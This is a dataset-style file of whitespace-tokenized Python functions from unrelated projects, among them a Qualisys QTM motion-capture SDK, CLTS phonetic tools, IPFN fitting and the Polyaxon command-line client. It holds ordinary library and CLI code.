def require_template_debug ( f ) : def _ ( * args , * * kwargs ) : TEMPLATE_DEBUG = getattr ( settings , 'TEMPLATE_DEBUG' , False ) return f ( * args , * * kwargs ) if TEMPLATE_DEBUG else '' return _
def pydevd ( context ) : global pdevd_not_available if pdevd_not_available : return '' try : import pydevd except ImportError : pdevd_not_available = True return '' render = lambda s : template . Template ( s ) . render ( context ) availables = get_variables ( context ) for var in availables : locals ( ) [ var ] = context [ var ] #catch the case where no client is listening try : pydevd . settrace ( ) except socket . error : pdevd_not_available = True return ''
def _flatten ( iterable ) : for i in iterable : if isinstance ( i , Iterable ) and not isinstance ( i , string_types ) : for sub_i in _flatten ( i ) : yield sub_i else : yield i
def parse_log_messages ( self , text ) : regex = r"commit ([0-9a-f]+)\nAuthor: (.*?)\n\n(.*?)(?:\n\n|$)" messages = re . findall ( regex , text , re . DOTALL ) parsed = [ ] for commit , author , message in messages : parsed . append ( ( commit [ : 10 ] , re . sub ( r"\s*<.*?>" , "" , author ) , # Remove email address if present message . strip ( ) ) ) return parsed
def determine_paths ( self , package_name = None , create_package_dir = False , dry_run = False ) : # Give preference to the environment variable here as it will not  # derefrence sym links self . project_dir = Path ( os . getenv ( 'PWD' ) or os . getcwd ( ) ) # Try and work out the project name distribution = self . get_distribution ( ) if distribution : # Get name from setup.py self . project_name = distribution . get_name ( ) else : # ...failing that, use the current directory name self . project_name = self . project_dir . name # Descend into the 'src' directory to find the package  # if necessary if os . path . isdir ( self . project_dir / "src" ) : package_search_dir = self . project_dir / "src" else : package_search_dir = self . project_dir created_package_dir = False if not package_name : # Lets try and work out the package_name from the project_name package_name = self . project_name . replace ( "-" , "_" ) # Now do some fuzzy matching def get_matches ( name ) : possibles = [ n for n in os . listdir ( package_search_dir ) if os . path . isdir ( package_search_dir / n ) ] return difflib . get_close_matches ( name , possibles , n = 1 , cutoff = 0.8 ) close = get_matches ( package_name ) # If no matches, try removing the first part of the package name # (e.g. django-guardian becomes guardian) if not close and "_" in package_name : short_package_name = "_" . join ( package_name . split ( "_" ) [ 1 : ] ) close = get_matches ( short_package_name ) if not close : if create_package_dir : package_dir = package_search_dir / package_name # Gets set to true even during dry run created_package_dir = True if not dry_run : print ( "Creating package directory at %s" % package_dir ) os . mkdir ( package_dir ) else : print ( "Would have created package directory at %s" % package_dir ) else : raise CommandError ( "Could not guess the package name. Specify it using --name." ) else : package_name = close [ 0 ] self . package_name = package_name self . package_dir = package_search_dir / package_name if not os . path . exists ( self . package_dir ) and not created_package_dir : raise CommandError ( "Package directory did not exist at %s. Perhaps specify it using --name" % self . package_dir )
def get_sha ( a_file , settings = None ) : if settings : error = settings [ "error" ] else : error = ERROR_FN try : BLOCKSIZE = 65536 hasher = hashlib . sha1 ( ) with io . open ( a_file , "rb" ) as fh : buf = fh . read ( BLOCKSIZE ) while len ( buf ) > 0 : hasher . update ( buf ) buf = fh . read ( BLOCKSIZE ) the_hash = hasher . hexdigest ( ) except IOError : errmes = "File '{}' could not be read! Exiting!" . format ( a_file ) error ( errmes ) sys . exit ( 1 ) except : errmes = "Unspecified error returning sha1 hash. Exiting!" error ( errmes ) sys . exit ( 1 ) return the_hash
def find_standard_sakefile ( settings ) : error = settings [ "error" ] if settings [ "customsake" ] : custom = settings [ "customsake" ] if not os . path . isfile ( custom ) : error ( "Specified sakefile '{}' doesn't exist" , custom ) sys . exit ( 1 ) return custom # no custom specified, going over defaults in order for name in [ "Sakefile" , "Sakefile.yaml" , "Sakefile.yml" ] : if os . path . isfile ( name ) : return name error ( "Error: there is no Sakefile to read" ) sys . exit ( 1 )
def itertable ( table ) : for item in table : res = { k . lower ( ) : nfd ( v ) if isinstance ( v , text_type ) else v for k , v in item . items ( ) } for extra in res . pop ( 'extra' , [ ] ) : k , _ , v = extra . partition ( ':' ) res [ k . strip ( ) ] = v . strip ( ) yield res
def _make_package ( args ) : # pragma: no cover from lingpy . sequence . sound_classes import token2class from lingpy . data import Model columns = [ 'LATEX' , 'FEATURES' , 'SOUND' , 'IMAGE' , 'COUNT' , 'NOTE' ] bipa = TranscriptionSystem ( 'bipa' ) for src , rows in args . repos . iter_sources ( type = 'td' ) : args . log . info ( 'TranscriptionData {0} ...' . format ( src [ 'NAME' ] ) ) uritemplate = URITemplate ( src [ 'URITEMPLATE' ] ) if src [ 'URITEMPLATE' ] else None out = [ [ 'BIPA_GRAPHEME' , 'CLTS_NAME' , 'GENERATED' , 'EXPLICIT' , 'GRAPHEME' , 'URL' ] + columns ] graphemes = set ( ) for row in rows : if row [ 'GRAPHEME' ] in graphemes : args . log . warn ( 'skipping duplicate grapheme: {0}' . format ( row [ 'GRAPHEME' ] ) ) continue graphemes . add ( row [ 'GRAPHEME' ] ) if not row [ 'BIPA' ] : bipa_sound = bipa [ row [ 'GRAPHEME' ] ] explicit = '' else : bipa_sound = bipa [ row [ 'BIPA' ] ] explicit = '+' generated = '+' if bipa_sound . generated else '' if is_valid_sound ( bipa_sound , bipa ) : bipa_grapheme = bipa_sound . s bipa_name = bipa_sound . name else : bipa_grapheme , bipa_name = '<NA>' , '<NA>' url = uritemplate . expand ( * * row ) if uritemplate else row . get ( 'URL' , '' ) out . append ( [ bipa_grapheme , bipa_name , generated , explicit , row [ 'GRAPHEME' ] , url ] + [ row . get ( c , '' ) for c in columns ] ) found = len ( [ o for o in out if o [ 0 ] != '<NA>' ] ) args . log . info ( '... {0} of {1} graphemes found ({2:.0f}%)' . format ( found , len ( out ) , found / len ( out ) * 100 ) ) with UnicodeWriter ( pkg_path ( 'transcriptiondata' , '{0}.tsv' . format ( src [ 'NAME' ] ) ) , delimiter = '\t' ) as writer : writer . writerows ( out ) count = 0 with UnicodeWriter ( pkg_path ( 'soundclasses' , 'lingpy.tsv' ) , delimiter = '\t' ) as writer : writer . writerow ( [ 'CLTS_NAME' , 'BIPA_GRAPHEME' ] + SOUNDCLASS_SYSTEMS ) for grapheme , sound in sorted ( bipa . sounds . items ( ) ) : if not sound . alias : writer . writerow ( [ sound . name , grapheme ] + [ token2class ( grapheme , Model ( cls ) ) for cls in SOUNDCLASS_SYSTEMS ] ) count += 1 args . log . info ( 'SoundClasses: {0} written to file.' . format ( count ) )
def is_valid_sound ( sound , ts ) : if isinstance ( sound , ( Marker , UnknownSound ) ) : return False s1 = ts [ sound . name ] s2 = ts [ sound . s ] return s1 . name == s2 . name and s1 . s == s2 . s
def normalize ( self , string ) : return '' . join ( [ self . _normalize . get ( x , x ) for x in nfd ( string ) ] )
def _from_name ( self , string ) : components = string . split ( ' ' ) if frozenset ( components ) in self . features : return self . features [ frozenset ( components ) ] rest , sound_class = components [ : - 1 ] , components [ - 1 ] if sound_class in [ 'diphthong' , 'cluster' ] : if string . startswith ( 'from ' ) and 'to ' in string : extension = { 'diphthong' : 'vowel' , 'cluster' : 'consonant' } [ sound_class ] string_ = ' ' . join ( string . split ( ' ' ) [ 1 : - 1 ] ) from_ , to_ = string_ . split ( ' to ' ) v1 , v2 = frozenset ( from_ . split ( ' ' ) + [ extension ] ) , frozenset ( to_ . split ( ' ' ) + [ extension ] ) if v1 in self . features and v2 in self . features : s1 , s2 = ( self . features [ v1 ] , self . features [ v2 ] ) if sound_class == 'diphthong' : return Diphthong . from_sounds ( s1 + s2 , s1 , s2 , self ) # noqa: F405 else : return Cluster . from_sounds ( s1 + s2 , s1 , s2 , self ) # noqa: F405 else : # try to generate the sounds if they are not there s1 , s2 = self . _from_name ( from_ + ' ' + extension ) , self . _from_name ( to_ + ' ' + extension ) if not ( isinstance ( s1 , UnknownSound ) or isinstance ( s2 , UnknownSound ) ) : # noqa: F405 if sound_class == 'diphthong' : return Diphthong . from_sounds ( # noqa: F405 s1 + s2 , s1 , s2 , self ) return Cluster . from_sounds ( s1 + s2 , s1 , s2 , self ) # noqa: F405 raise ValueError ( 'components could not be found in system' ) else : raise ValueError ( 'name string is erroneously encoded' ) if sound_class not in self . sound_classes : raise ValueError ( 'no sound class specified' ) args = { self . _feature_values . get ( comp , '?' ) : comp for comp in rest } if '?' in args : raise ValueError ( 'string contains unknown features' ) args [ 'grapheme' ] = '' args [ 'ts' ] = self sound = self . sound_classes [ sound_class ] ( * * args ) if sound . featureset not in self . features : sound . generated = True return sound return self . features [ sound . featureset ]
def iteration ( self ) : i = 0 conv = np . inf old_conv = - np . inf conv_list = [ ] m = self . original # If the original data input is in pandas DataFrame format if isinstance ( self . original , pd . DataFrame ) : ipfn_method = self . ipfn_df elif isinstance ( self . original , np . ndarray ) : ipfn_method = self . ipfn_np self . original = self . original . astype ( 'float64' ) else : print ( 'Data input instance not recognized' ) sys . exit ( 0 ) while ( ( i <= self . max_itr and conv > self . conv_rate ) and ( i <= self . max_itr and abs ( conv - old_conv ) > self . rate_tolerance ) ) : old_conv = conv m , conv = ipfn_method ( m , self . aggregates , self . dimensions , self . weight_col ) conv_list . append ( conv ) i += 1 converged = 1 if i <= self . max_itr : if not conv > self . conv_rate : print ( 'ipfn converged: convergence_rate below threshold' ) elif not abs ( conv - old_conv ) > self . rate_tolerance : print ( 'ipfn converged: convergence_rate not updating or below rate_tolerance' ) else : print ( 'Maximum iterations reached' ) converged = 0 # Handle the verbose if self . verbose == 0 : return m elif self . verbose == 1 : return m , converged elif self . verbose == 2 : return m , converged , pd . DataFrame ( { 'iteration' : range ( i ) , 'conv' : conv_list } ) . set_index ( 'iteration' ) else : print ( 'wrong verbose input, return None' ) sys . exit ( 0 )
def get_days_span ( self , month_index ) : is_first_month = month_index == 0 is_last_month = month_index == self . __len__ ( ) - 1 y = int ( self . start_date . year + ( self . start_date . month + month_index ) / 13 ) m = int ( ( self . start_date . month + month_index ) % 12 or 12 ) total = calendar . monthrange ( y , m ) [ 1 ] if is_first_month and is_last_month : return ( self . end_date - self . start_date ) . days + 1 else : if is_first_month : return total - self . start_date . day + 1 elif is_last_month : return self . end_date . day else : return total
def _calculate_period ( self , vals ) : if len ( vals ) < 4 : return None if self . firmware [ 'major' ] < 16 : return ( ( vals [ 3 ] << 24 ) | ( vals [ 2 ] << 16 ) | ( vals [ 1 ] << 8 ) | vals [ 0 ] ) / 12e6 else : return self . _calculate_float ( vals )
def start ( self ) : self . receiver = self . Receiver ( self . read , self . write , self . send_lock , self . senders , self . frames_received , callback = self . receive_callback , fcs_nack = self . fcs_nack , ) self . receiver . start ( )
def stop ( self ) : if self . receiver != None : self . receiver . join ( ) for s in self . senders . values ( ) : s . join ( )
def replace ( self , * * k ) : if self . date != 'infinity' : return Date ( self . date . replace ( * * k ) ) else : return Date ( 'infinity' )
def validate_token ( self , request , consumer , token ) : oauth_server , oauth_request = oauth_provider . utils . initialize_server_request ( request ) oauth_server . verify_request ( oauth_request , consumer , token )
def check_nonce ( self , request , oauth_request ) : oauth_nonce = oauth_request [ 'oauth_nonce' ] oauth_timestamp = oauth_request [ 'oauth_timestamp' ] return check_nonce ( request , oauth_request , oauth_nonce , oauth_timestamp )
def deliveries ( self ) : key = make_key ( event = self . object . event , owner_name = self . object . owner . username , identifier = self . object . identifier ) return redis . lrange ( key , 0 , 20 )
def event_choices ( events ) : if events is None : msg = "Please add some events in settings.WEBHOOK_EVENTS." raise ImproperlyConfigured ( msg ) try : choices = [ ( x , x ) for x in events ] except TypeError : """ Not a valid iterator, so we raise an exception """ msg = "settings.WEBHOOK_EVENTS must be an iterable object." raise ImproperlyConfigured ( msg ) return choices
def checkSerial ( self ) : for item in self . rxSerial ( self . _TUN . _tun . mtu ) : # print("about to send: {0}".format(item)) try : self . _TUN . _tun . write ( item ) except pytun . Error as error : print ( "pytun error writing: {0}" . format ( item ) ) print ( error )
def value_from_datadict ( self , * args , * * kwargs ) : value = super ( RichTextWidget , self ) . value_from_datadict ( * args , * * kwargs ) if value is not None : value = self . get_sanitizer ( ) ( value ) return value
def heappop_max ( heap ) : lastelt = heap . pop ( ) # raises appropriate IndexError if heap is empty if heap : returnitem = heap [ 0 ] heap [ 0 ] = lastelt _siftup_max ( heap , 0 ) return returnitem return lastelt
def heapreplace_max ( heap , item ) : returnitem = heap [ 0 ] # raises appropriate IndexError if heap is empty heap [ 0 ] = item _siftup_max ( heap , 0 ) return returnitem
def heappush_max ( heap , item ) : heap . append ( item ) _siftdown_max ( heap , 0 , len ( heap ) - 1 )
def heappushpop_max ( heap , item ) : if heap and heap [ 0 ] > item : # if item >= heap[0], it will be popped immediately after pushed item , heap [ 0 ] = heap [ 0 ] , item _siftup_max ( heap , 0 ) return item
def validate_response ( expected_responses ) : def internal_decorator ( function ) : @ wraps ( function ) async def wrapper ( * args , * * kwargs ) : response = await function ( * args , * * kwargs ) for expected_response in expected_responses : if response . startswith ( expected_response ) : return response raise QRTCommandException ( "Expected %s but got %s" % ( expected_responses , response ) ) return wrapper return internal_decorator
async def qtm_version ( self ) : return await asyncio . wait_for ( self . _protocol . send_command ( "qtmversion" ) , timeout = self . _timeout )
async def stream_frames_stop ( self ) : self . _protocol . set_on_packet ( None ) cmd = "streamframes stop" await self . _protocol . send_command ( cmd , callback = False )
async def release_control ( self ) : cmd = "releasecontrol" return await asyncio . wait_for ( self . _protocol . send_command ( cmd ) , timeout = self . _timeout )
async def start ( self , rtfromfile = False ) : cmd = "start" + ( " rtfromfile" if rtfromfile else "" ) return await asyncio . wait_for ( self . _protocol . send_command ( cmd ) , timeout = self . _timeout )
async def set_qtm_event ( self , event = None ) : cmd = "event%s" % ( "" if event is None else " " + event ) return await asyncio . wait_for ( self . _protocol . send_command ( cmd ) , timeout = self . _timeout )
def data_received ( self , data ) : self . _received_data += data h_size = RTheader . size data = self . _received_data size , type_ = RTheader . unpack_from ( data , 0 ) while len ( data ) >= size : self . _parse_received ( data [ h_size : size ] , type_ ) data = data [ size : ] if len ( data ) < h_size : break size , type_ = RTheader . unpack_from ( data , 0 ) self . _received_data = data
def get_analog ( self , component_info = None , data = None , component_position = None ) : components = [ ] append_components = components . append for _ in range ( component_info . device_count ) : component_position , device = QRTPacket . _get_exact ( RTAnalogDevice , data , component_position ) if device . sample_count > 0 : component_position , sample_number = QRTPacket . _get_exact ( RTSampleNumber , data , component_position ) RTAnalogChannel . format = struct . Struct ( RTAnalogChannel . format_str % device . sample_count ) for _ in range ( device . channel_count ) : component_position , channel = QRTPacket . _get_tuple ( RTAnalogChannel , data , component_position ) append_components ( ( device , sample_number , channel ) ) return components
def get_analog_single ( self , component_info = None , data = None , component_position = None ) : components = [ ] append_components = components . append for _ in range ( component_info . device_count ) : component_position , device = QRTPacket . _get_exact ( RTAnalogDeviceSingle , data , component_position ) RTAnalogDeviceSamples . format = struct . Struct ( RTAnalogDeviceSamples . format_str % device . channel_count ) component_position , sample = QRTPacket . _get_tuple ( RTAnalogDeviceSamples , data , component_position ) append_components ( ( device , sample ) ) return components
def get_force ( self , component_info = None , data = None , component_position = None ) : components = [ ] append_components = components . append for _ in range ( component_info . plate_count ) : component_position , plate = QRTPacket . _get_exact ( RTForcePlate , data , component_position ) force_list = [ ] for _ in range ( plate . force_count ) : component_position , force = QRTPacket . _get_exact ( RTForce , data , component_position ) force_list . append ( force ) append_components ( ( plate , force_list ) ) return components
def get_force_single ( self , component_info = None , data = None , component_position = None ) : components = [ ] append_components = components . append for _ in range ( component_info . plate_count ) : component_position , plate = QRTPacket . _get_exact ( RTForcePlateSingle , data , component_position ) component_position , force = QRTPacket . _get_exact ( RTForce , data , component_position ) append_components ( ( plate , force ) ) return components
def get_6d ( self , component_info = None , data = None , component_position = None ) : components = [ ] append_components = components . append for _ in range ( component_info . body_count ) : component_position , position = QRTPacket . _get_exact ( RT6DBodyPosition , data , component_position ) component_position , matrix = QRTPacket . _get_tuple ( RT6DBodyRotation , data , component_position ) append_components ( ( position , matrix ) ) return components
def get_6d_euler ( self , component_info = None , data = None , component_position = None ) : components = [ ] append_components = components . append for _ in range ( component_info . body_count ) : component_position , position = QRTPacket . _get_exact ( RT6DBodyPosition , data , component_position ) component_position , euler = QRTPacket . _get_exact ( RT6DBodyEuler , data , component_position ) append_components ( ( position , euler ) ) return components
def get_3d_markers ( self , component_info = None , data = None , component_position = None ) : return self . _get_3d_markers ( RT3DMarkerPosition , component_info , data , component_position )
def get_3d_markers_residual ( self , component_info = None , data = None , component_position = None ) : return self . _get_3d_markers ( RT3DMarkerPositionResidual , component_info , data , component_position )
def get_3d_markers_no_label ( self , component_info = None , data = None , component_position = None ) : return self . _get_3d_markers ( RT3DMarkerPositionNoLabel , component_info , data , component_position )
def get_3d_markers_no_label_residual ( self , component_info = None , data = None , component_position = None ) : return self . _get_3d_markers ( RT3DMarkerPositionNoLabelResidual , component_info , data , component_position )
async def await_event ( self , event = None , timeout = None ) : if self . event_future is not None : raise Exception ( "Can't wait on multiple events!" ) result = await asyncio . wait_for ( self . _wait_loop ( event ) , timeout ) return result
def send_command ( self , command , callback = True , command_type = QRTPacketType . PacketCommand ) : if self . transport is not None : cmd_length = len ( command ) LOG . debug ( "S: %s" , command ) self . transport . write ( struct . pack ( RTCommand % cmd_length , RTheader . size + cmd_length + 1 , command_type . value , command . encode ( ) , b"\0" , ) ) future = self . loop . create_future ( ) if callback : self . request_queue . append ( future ) else : future . set_result ( None ) return future raise QRTCommandException ( "Not connected!" )
async def reboot ( ip_address ) : _ , protocol = await asyncio . get_event_loop ( ) . create_datagram_endpoint ( QRebootProtocol , local_addr = ( ip_address , 0 ) , allow_broadcast = True , reuse_address = True , ) LOG . info ( "Sending reboot on %s" , ip_address ) protocol . send_reboot ( )
def on_packet ( packet ) : print ( "Framenumber: {}" . format ( packet . framenumber ) ) header , markers = packet . get_3d_markers ( ) print ( "Component info: {}" . format ( header ) ) for marker in markers : print ( "\t" , marker )
def datagram_received ( self , datagram , address ) : size , _ = RTheader . unpack_from ( datagram , 0 ) info , = struct . unpack_from ( "{0}s" . format ( size - 3 - 8 ) , datagram , RTheader . size ) base_port , = QRTDiscoveryBasePort . unpack_from ( datagram , size - 2 ) if self . receiver is not None : self . receiver ( QRTDiscoveryResponse ( info , address [ 0 ] , base_port ) )
def send_discovery_packet ( self ) : if self . port is None : return self . transport . sendto ( QRTDiscoveryP1 . pack ( QRTDiscoveryPacketSize , QRTPacketType . PacketDiscover . value ) + QRTDiscoveryP2 . pack ( self . port ) , ( "<broadcast>" , 22226 ) , )
async def packet_receiver ( queue ) : LOG . info ( "Entering packet_receiver" ) while True : packet = await queue . get ( ) if packet is None : break LOG . info ( "Framenumber %s" , packet . framenumber ) LOG . info ( "Exiting packet_receiver" )
async def choose_qtm_instance ( interface ) : instances = { } print ( "Available QTM instances:" ) async for i , qtm_instance in AsyncEnumerate ( qtm . Discover ( interface ) , start = 1 ) : instances [ i ] = qtm_instance print ( "{} - {}" . format ( i , qtm_instance . info ) ) try : choice = int ( input ( "Connect to: " ) ) if choice not in instances : raise ValueError except ValueError : LOG . error ( "Invalid choice" ) return None return instances [ choice ] . host
async def package_receiver ( queue ) : LOG . info ( "Entering package_receiver" ) while True : packet = await queue . get ( ) if packet is None : break LOG . info ( "Framenumber %s" , packet . framenumber ) header , cameras = packet . get_2d_markers ( ) LOG . info ( "Component info: %s" , header ) for i , camera in enumerate ( cameras , 1 ) : LOG . info ( "Camera %d" , i ) for marker in camera : LOG . info ( "\t%s" , marker ) LOG . info ( "Exiting package_receiver" )
def create_body_index ( xml_string ) : xml = ET . fromstring ( xml_string ) body_to_index = { } for index , body in enumerate ( xml . findall ( "*/Body/Name" ) ) : body_to_index [ body . text . strip ( ) ] = index return body_to_index
def build_swig ( ) : print ( "Looking for FANN libs..." ) find_fann ( ) print ( "running SWIG..." ) swig_bin = find_swig ( ) swig_cmd = [ swig_bin , '-c++' , '-python' , 'fann2/fann2.i' ] subprocess . Popen ( swig_cmd ) . wait ( )
def experiment ( ctx , project , experiment ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project ctx . obj [ 'experiment' ] = experiment
def upload ( sync = True ) : # pylint:disable=assign-to-new-keyword project = ProjectManager . get_config_or_raise ( ) files = IgnoreManager . get_unignored_file_paths ( ) try : with create_tarfile ( files , project . name ) as file_path : with get_files_in_current_directory ( 'repo' , [ file_path ] ) as ( files , files_size ) : try : PolyaxonClient ( ) . project . upload_repo ( project . user , project . name , files , files_size , sync = sync ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not upload code for project `{}`.' . format ( project . name ) ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) Printer . print_error ( 'Check the project exists, ' 'and that you have access rights, ' 'this could happen as well when uploading large files.' 'If you are running a notebook and mounting the code to the notebook, ' 'you should stop it before uploading.' ) sys . exit ( 1 ) Printer . print_success ( 'Files uploaded.' ) except Exception as e : Printer . print_error ( "Could not upload the file." ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 )
def cluster ( node ) : cluster_client = PolyaxonClient ( ) . cluster if node : try : node_config = cluster_client . get_node ( node ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not load node `{}` info.' . format ( node ) ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) get_node_info ( node_config ) else : try : cluster_config = cluster_client . get_cluster ( ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not load cluster info.' ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) get_cluster_info ( cluster_config )
def check ( file , # pylint:disable=redefined-builtin version , definition ) : file = file or 'polyaxonfile.yaml' specification = check_polyaxonfile ( file ) . specification if version : Printer . decorate_format_value ( 'The version is: {}' , specification . version , 'yellow' ) if definition : job_condition = ( specification . is_job or specification . is_build or specification . is_notebook or specification . is_tensorboard ) if specification . is_experiment : Printer . decorate_format_value ( 'This polyaxon specification has {}' , 'One experiment' , 'yellow' ) if job_condition : Printer . decorate_format_value ( 'This {} polyaxon specification is valid' , specification . kind , 'yellow' ) if specification . is_group : experiments_def = specification . experiments_def click . echo ( 'This polyaxon specification has experiment group with the following definition:' ) get_group_experiments_info ( * * experiments_def ) return specification
def job ( ctx , project , job ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project ctx . obj [ 'job' ] = job
def pprint ( value ) : click . echo ( json . dumps ( value , sort_keys = True , indent = 4 , separators = ( ',' , ': ' ) ) )
def login ( token , username , password ) : auth_client = PolyaxonClient ( ) . auth if username : # Use username / password login if not password : password = click . prompt ( 'Please enter your password' , type = str , hide_input = True ) password = password . strip ( ) if not password : logger . info ( 'You entered an empty string. ' 'Please make sure you enter your password correctly.' ) sys . exit ( 1 ) credentials = CredentialsConfig ( username = username , password = password ) try : access_code = auth_client . login ( credentials = credentials ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not login.' ) Printer . print_error ( 'Error Message `{}`.' . format ( e ) ) sys . exit ( 1 ) if not access_code : Printer . print_error ( "Failed to login" ) return else : if not token : token_url = "{}/app/token" . format ( auth_client . config . http_host ) click . confirm ( 'Authentication token page will now open in your browser. Continue?' , abort = True , default = True ) click . launch ( token_url ) logger . info ( "Please copy and paste the authentication token." ) token = click . prompt ( 'This is an invisible field. Paste token and press ENTER' , type = str , hide_input = True ) if not token : logger . info ( "Empty token received. " "Make sure your shell is handling the token appropriately." ) logger . info ( "See docs for help: http://docs.polyaxon.com/polyaxon_cli/commands/auth" ) return access_code = token . strip ( " " ) # Set user try : AuthConfigManager . purge ( ) user = PolyaxonClient ( ) . auth . get_user ( token = access_code ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not load user info.' ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) access_token = AccessTokenConfig ( username = user . username , token = access_code ) AuthConfigManager . set_config ( access_token ) Printer . print_success ( "Login successful" ) # Reset current cli server_version = get_server_version ( ) current_version = get_current_version ( ) log_handler = get_log_handler ( ) CliConfigManager . reset ( check_count = 0 , current_version = current_version , min_version = server_version . min_version , log_handler = log_handler )
def whoami ( ) : try : user = PolyaxonClient ( ) . auth . get_user ( ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not load user info.' ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) click . echo ( "\nUsername: {username}, Email: {email}\n" . format ( * * user . to_dict ( ) ) )
def build ( ctx , project , build ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project ctx . obj [ 'build' ] = build
def init ( project , polyaxonfile ) : user , project_name = get_project_or_local ( project ) try : project_config = PolyaxonClient ( ) . project . get_project ( user , project_name ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Make sure you have a project with this name `{}`' . format ( project ) ) Printer . print_error ( 'You can a create new project with this command: ' 'polyaxon project create ' '--name={} [--description=...] [--tags=...]' . format ( project_name ) ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) init_project = False if ProjectManager . is_initialized ( ) : local_project = ProjectManager . get_config ( ) click . echo ( 'Warning! This project is already initialized with the following project:' ) with clint . textui . indent ( 4 ) : clint . textui . puts ( 'User: {}' . format ( local_project . user ) ) clint . textui . puts ( 'Project: {}' . format ( local_project . name ) ) if click . confirm ( 'Would you like to override this current config?' , default = False ) : init_project = True else : init_project = True if init_project : ProjectManager . purge ( ) ProjectManager . set_config ( project_config , init = True ) Printer . print_success ( 'Project was initialized' ) else : Printer . print_header ( 'Project config was not changed.' ) init_ignore = False if IgnoreManager . is_initialized ( ) : click . echo ( 'Warning! Found a .polyaxonignore file.' ) if click . confirm ( 'Would you like to override it?' , default = False ) : init_ignore = True else : init_ignore = True if init_ignore : IgnoreManager . init_config ( ) Printer . print_success ( 'New .polyaxonignore file was created.' ) else : Printer . print_header ( '.polyaxonignore file was not changed.' ) if polyaxonfile : create_polyaxonfile ( )
def bookmark ( ctx , username ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'username' ] = username
def _remove_trailing_spaces ( line ) : while line . endswith ( ' ' ) and not line . endswith ( '\\ ' ) : line = line [ : - 1 ] return line . replace ( '\\ ' , ' ' )
def find_matching ( cls , path , patterns ) : for pattern in patterns : if pattern . match ( path ) : yield pattern
def is_ignored ( cls , path , patterns ) : status = None for pattern in cls . find_matching ( path , patterns ) : status = pattern . is_exclude return status
def _matches_patterns ( path , patterns ) : for glob in patterns : try : if PurePath ( path ) . match ( glob ) : return True except TypeError : pass return False
def _ignore_path ( cls , path , ignore_list = None , white_list = None ) : ignore_list = ignore_list or [ ] white_list = white_list or [ ] return ( cls . _matches_patterns ( path , ignore_list ) and not cls . _matches_patterns ( path , white_list ) )
def group ( ctx , project , group ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project ctx . obj [ 'group' ] = group
def config ( list ) : # pylint:disable=redefined-builtin if list : _config = GlobalConfigManager . get_config_or_default ( ) Printer . print_header ( 'Current config:' ) dict_tabulate ( _config . to_dict ( ) )
def teardown ( file ) : # pylint:disable=redefined-builtin config = read_deployment_config ( file ) manager = DeployManager ( config = config , filepath = file ) exception = None try : if click . confirm ( 'Would you like to execute pre-delete hooks?' , default = True ) : manager . teardown ( hooks = True ) else : manager . teardown ( hooks = False ) except Exception as e : Printer . print_error ( 'Polyaxon could not teardown the deployment.' ) exception = e if exception : Printer . print_error ( 'Error message `{}`.' . format ( exception ) )
def create_tarfile ( files , project_name ) : fd , filename = tempfile . mkstemp ( prefix = "polyaxon_{}" . format ( project_name ) , suffix = '.tar.gz' ) with tarfile . open ( filename , "w:gz" ) as tar : for f in files : tar . add ( f ) yield filename # clear os . close ( fd ) os . remove ( filename )
def check_cli_version ( ) : if not CliConfigManager . should_check ( ) : return server_version = get_server_version ( ) current_version = get_current_version ( ) CliConfigManager . reset ( current_version = current_version , min_version = server_version . min_version ) if LooseVersion ( current_version ) < LooseVersion ( server_version . min_version ) : click . echo ( """Your version of CLI ({}) is no longer compatible with server.""" . format ( current_version ) ) if click . confirm ( "Do you want to upgrade to " "version {} now?" . format ( server_version . latest_version ) ) : pip_upgrade ( ) sys . exit ( 0 ) else : clint . textui . puts ( "Your can manually run:" ) with clint . textui . indent ( 4 ) : clint . textui . puts ( "pip install -U polyaxon-cli" ) clint . textui . puts ( "to upgrade to the latest version `{}`" . format ( server_version . latest_version ) ) sys . exit ( 0 ) elif LooseVersion ( current_version ) < LooseVersion ( server_version . latest_version ) : clint . textui . puts ( "New version of CLI ({}) is now available. To upgrade run:" . format ( server_version . latest_version ) ) with clint . textui . indent ( 4 ) : clint . textui . puts ( "pip install -U polyaxon-cli" ) elif LooseVersion ( current_version ) > LooseVersion ( server_version . latest_version ) : clint . textui . puts ( "You version of CLI ({}) is ahead of the latest version " "supported by Polyaxon Platform ({}) on your cluster, " "and might be incompatible." . format ( current_version , server_version . latest_version ) )
